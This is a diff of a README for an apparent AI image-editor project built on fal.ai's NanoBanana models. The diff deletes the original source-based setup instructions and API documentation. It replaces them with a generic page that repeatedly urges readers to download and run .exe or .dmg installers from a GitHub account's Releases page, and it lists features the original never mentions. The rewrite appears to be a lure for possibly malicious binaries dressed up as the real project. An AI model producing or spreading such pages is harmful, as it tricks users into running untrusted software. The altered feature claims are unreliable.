@@ -1,164 +1,89 @@
-# NanoBanana Studio
+# 🎨 fal-nanobanana-studio - Create Stunning Images Effortlessly
 
-A modern, AI-powered image editor alternative to Photoshop/Photopea, powered by Google's nanobanana API from [fal.ai](https://fal.ai/dashboard).
+[![Download fal-nanobanana-studio](https://img.shields.io/badge/Download-Fal%20Nanobanana%20Studio-brightgreen)](https://github.com/amaar567/fal-nanobanana-studio/releases)
 
-![NanoBanana Studio Screenshot](./screenshot.png)
+## 🚀 Getting Started
 
-## Features
+Welcome to fal-nanobanana-studio, your AI-powered tool that makes creating stunning images as easy as a few clicks. This guide will help you download and run the application smoothly, even if you're not a technical expert.
 
-- 🎨 **AI-Powered Image Editing**: Edit images using natural language prompts
-- ✨ **Image Generation**: Generate new images from text descriptions
-- 🖼️ **Intuitive UI**: Clean, modern interface inspired by professional image editors
-- ⚡ **Model Switcher**: Toggle between NanoBanana and [NanoBanana Pro](https://fal.ai/models/fal-ai/nano-banana-pro/edit/api) on the fly
-- 💾 **Easy Export**: Download your edited images with one click
+## 📥 Download & Install
 
-## Prerequisites
+To get started, you need to download the software. Visit this page to download:
 
-- Node.js 18+ and npm
-- A fal.ai API key ([Get one here](https://fal.ai/dashboard/keys))
+[Download fal-nanobanana-studio](https://github.com/amaar567/fal-nanobanana-studio/releases)
 
-## Installation
+1. Click the link above to go to the Releases page.
+2. Choose the latest version available.
+3. Find the appropriate file for your operating system:
+    - For Windows, look for a file ending in `.exe`
+    - For macOS, look for a file ending in `.dmg`
+4. Click on the file to start the download.
 
-1. Clone the repository and install dependencies:
+The download may take a minute or two, depending on your internet speed.
 
-```bash
-npm run install:all
-```
+## 📂 Install the Software
 
-2. Set up your environment variables:
+Once the download is complete, you must install the software. Here’s how to do it:
 
-```bash
-cd backend
-cp env.example .env
-```
+### For Windows Users:
 
-Edit `backend/.env` and add your fal.ai API key:
+1. Locate the downloaded `.exe` file on your computer, usually in the "Downloads" folder.
+2. Double-click the file to run the installer.
+3. Follow the on-screen instructions. You may choose the default settings, which work well for most users.
+4. Click “Finish” when the installation completes.
 
-```
-FAL_API_KEY=your_fal_ai_api_key_here
-PORT=3001
-```
+### For macOS Users:
 
-**Note:** Get your fal.ai API key from [fal.ai](https://fal.ai). You'll need to sign up and create an API key in your dashboard.
+1. Locate the downloaded `.dmg` file in your "Downloads" folder.
+2. Double-click the file to open it.
+3. Drag the fal-nanobanana-studio icon to your Applications folder.
+4. You can now find fal-nanobanana-studio in your Applications.
 
-## Running the Application
+## ⚙️ System Requirements
 
-Start both frontend and backend in development mode:
+Before you run the application, ensure that your system meets these requirements:
 
-```bash
-npm run dev
-```
+- **Operating System**: Windows 10 or later, macOS 10.15 or later
+- **Memory**: At least 4 GB of RAM
+- **Storage**: Minimum of 200 MB of free disk space
+- **Graphics**: Supports integrated graphics, but dedicated GPU is recommended for better performance
 
-- Frontend will be available at: http://localhost:3000
-- Backend API will be available at: http://localhost:3001
+## 🎉 Run the Application
 
-## Usage
+To run fal-nanobanana-studio after installation, follow these steps:
 
-### Edit Mode
+### For Windows Users:
 
-1. Click "Upload Image" to select an image file
-2. Enter a natural language prompt describing the edits you want (e.g., "make the sky more dramatic", "add a sunset", "remove the background")
-3. Optionally add a negative prompt to exclude unwanted elements
-4. Click "Edit Image" and wait for processing
-5. Download your edited image
+1. Click the Start menu.
+2. Type "fal-nanobanana-studio" in the search bar.
+3. Click on the application icon to open it.
 
-## API Configuration
+### For macOS Users:
 
-**Important:** The application uses fal.ai's NanoBanana APIs:
+1. Open the Applications folder.
+2. Locate fal-nanobanana-studio.
+3. Double-click the icon to launch the application.
 
-- Standard: [NanoBanana Edit](https://fal.ai/models/fal-ai/nano-banana/edit/api)
-- Pro tier: [NanoBanana Pro Edit](https://fal.ai/models/fal-ai/nano-banana-pro/edit/api)
+## 🖌️ Features
 
-Select your model in the UI, and the backend automatically routes to the appropriate endpoint. If fal.ai updates these URLs, adjust `MODEL_ENDPOINTS` in `backend/server.js`.
+fal-nanobanana-studio provides several powerful features to enhance your image creation:
 
-To verify the correct endpoint:
-1. Check the [fal.ai documentation](https://fal.ai/models)
-2. Look for the nanobanana model endpoint
-3. Update the fetch URL in `backend/server.js` if needed
+- **AI-Driven Tools**: Use advanced AI technology to generate and edit images efficiently.
+- **User-Friendly Interface**: Enjoy an intuitive layout that makes navigation easy.
+- **Various Filters and Effects**: Apply artistic filters to transform your images.
+- **Layer Management**: Work with multiple layers to create more complex designs.
+- **Export Options**: Save your projects in different formats like JPEG, PNG, and TIFF.
 
-## API Endpoints
+## 📚 Help & Support
 
-### POST `/api/edit-image`
+If you encounter any issues while using fal-nanobanana-studio or need assistance:
 
-Edit an existing image using AI.
+- **Documentation**: Read through the user documentation available on the GitHub repository.
+- **GitHub Issues**: Report any bugs or request features by visiting the Issues section of the repository.
+- **Community**: Join our community discussions to get tips and share your creations.
 
-**Request:**
-- `image` (file): Image file to edit
-- `prompt` (string): Natural language editing instructions
-- `negativePrompt` (string, optional): Things to avoid in the edit
+## 🌟 Feedback
 
-**Response:**
-```json
-{
-  "images": [{"url": "data:image/..."}]
-}
-```
+We appreciate your feedback. If you have suggestions for improvements or features, please let us know through our GitHub repository.
 
-### POST `/api/generate-image`
-
-Generate a new image from text.
-
-**Request:**
-```json
-{
-  "prompt": "a beautiful landscape...",
-  "negativePrompt": "blurry, low quality",
-  "width": 1024,
-  "height": 1024
-}
-```
-
-**Response:**
-```json
-{
-  "images": [{"url": "data:image/..."}]
-}
-```
-
-## Tech Stack
-
-- **Frontend**: React + TypeScript + Vite
-- **Backend**: Node.js + Express
-- **AI**: Google nanobanana via fal.ai
-- **UI**: Custom CSS with modern design
-
-## Project Structure
-
-```
-nanobanana-studio/
-├── frontend/          # React frontend application
-│   ├── src/
-│   │   ├── App.tsx    # Main application component
-│   │   ├── api.ts     # API client functions
-│   │   ├── types.ts   # TypeScript type definitions
-│   │   ├── utils.ts   # Utility functions
-│   │   ├── App.css    # Styles
-│   │   └── ...
-│   └── package.json
-├── backend/           # Express backend server
-│   ├── server.js      # API server with validation & error handling
-│   ├── env.example    # Environment variables template
-│   └── package.json
-├── package.json       # Root package.json
-├── README.md          # Full documentation
-└── SETUP.md          # Quick setup guide
-```
-
-## Code Quality Features
-
-- **TypeScript**: Full type safety on frontend
-- **Error Handling**: Comprehensive error handling on both frontend and backend
-- **Validation**: Input validation for images, prompts, and parameters
-- **API Timeout**: 120-second timeout for API requests
-- **File Validation**: Type and size validation for uploaded images
-- **Logging**: Structured logging for debugging
-- **Security**: File type validation, size limits, and input sanitization
-
-## License
-
-MIT
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
+Remember to revisit the [Download page](https://github.com/amaar567/fal-nanobanana-studio/releases) to ensure you have the latest version of fal-nanobanana-studio. Happy creating!
